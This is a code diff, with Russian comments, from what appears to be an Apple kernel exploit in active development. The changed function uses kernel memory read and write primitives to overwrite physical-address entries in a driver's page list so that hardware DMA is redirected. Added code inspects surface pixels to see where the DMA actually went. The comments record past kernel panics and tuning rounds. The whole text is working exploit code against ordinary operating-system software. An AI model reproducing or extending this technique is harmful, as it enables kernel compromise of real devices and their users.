@@ -5900,11 +5900,16 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         uint64_t newQ = 0;
         kreadbuf(hv, &origQ[h], 8);
         if (form == 2) {
-            // 1.9.115: raw-поле НЕ трогаем — производный кэш (пересчитывается
-            // при wire из page-list); его перезапись ломала владение кучей
-            // (panic 100734, zone mismatch zalloc.c:829).
-            kpNote(r, [NSString stringWithFormat:@"  hit #%d @ %#llx: raw-поле — пропускаем (производный кэш, wire пересчитает из pfn)", h, (unsigned long long)hv]);
-            continue;
+            // 1.9.117: raw-поле снова пишем — паника 100734 была не от него,
+            // а от teardown калибровочного коннекшена (наша же мина; с 1.9.115
+            // коннекшены живут до конца). По раунду 15 raw = кэш в записи
+            // драйвера, который execute и читает — без его подмены DMA идёт в
+            // оригинал.
+            if (origQ[h] != backingPA) {
+                kpNote(r, [NSString stringWithFormat:@"  hit #%d @ %#llx: уже не backing (%#llx) — пропуск", h, (unsigned long long)hv, (unsigned long long)origQ[h]]);
+                continue;
+            }
+            newQ = ctlPA;
         } else {
             uint32_t cur = form ? (uint32_t)(origQ[h] >> 32) : (uint32_t)origQ[h];
             if (cur != pfn32) {
@@ -5943,6 +5948,15 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         uint32_t px = *(volatile uint32_t *)(ctl + i);
         if (px != 0xCCCCCCCC && px != 0) { changed++; if (changed <= 4) kpNote(r, [NSString stringWithFormat:@"    ctl+%#x: %#010x", i, px]); }
     }
+    // Куда реально ушёл DMA: пиксели dst после submit — ненулевые = записал в
+    // оригинальный backing (DVA не последовал за подменой), пусто = не execute.
+    IOSurfaceLock(dstS, 0, NULL);
+    uint32_t *pxd = (uint32_t *)IOSurfaceGetBaseAddress(dstS);
+    int nzd = 0;
+    if (pxd) for (int i = 0; i < 1024; i++) if (pxd[i] && pxd[i] != 0x41544159) nzd++;
+    IOSurfaceUnlock(dstS, 0, NULL);
+    kpNote(r, [NSString stringWithFormat:@"  dst пиксели после submit: ненулевых = %d — %@", nzd,
+              nzd ? @"DMA ушёл в ОРИГИНАЛЬНЫЙ backing (кэш DVA не последовал за подменой)" : @"в dst пусто"]);
     // restore всех подменённых — не оставляем коррупцию
     for (int h = 0; h < hitN; h++)
         if (origQ[h]) kwritebuf(hitVAs[h], &origQ[h], 8);
